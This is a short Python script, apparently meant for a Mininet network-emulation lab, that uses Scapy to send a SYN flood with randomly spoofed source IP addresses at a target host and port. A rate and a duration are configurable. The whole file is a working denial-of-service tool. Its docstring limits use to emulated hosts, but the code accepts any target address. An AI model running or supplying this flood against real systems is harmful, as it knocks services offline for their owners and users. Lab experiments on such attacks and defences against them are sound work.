"""SYN flood via Scapy — spoofed source IPs, half-open connections. Requires root.
Only point this at hosts inside the emulated Mininet topology.
"""
import argparse
import time

from scapy.all import IP, TCP, RandIP, RandShort, send


def run(target, target_port=80, rate=500, duration=10, spoof_subnet="10.0.0.0/8", verbose=True):
    interval = 1.0 / rate
    end = time.time() + duration
    sent = 0
    while time.time() < end:
        pkt = (IP(src=RandIP(spoof_subnet), dst=target) /
               TCP(sport=RandShort(), dport=target_port, flags="S"))
        send(pkt, verbose=0)
        sent += 1
        time.sleep(interval)
    if verbose:
        print(f"syn_flood: sent {sent} packets to {target}:{target_port}")


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", required=True)
    parser.add_argument("--target-port", type=int, default=80)
    parser.add_argument("--rate", type=float, default=500, help="packets per second")
    parser.add_argument("--duration", type=float, default=10, help="seconds")
    args = parser.parse_args()
    run(args.target, args.target_port, args.rate, args.duration)


if __name__ == "__main__":
    main()
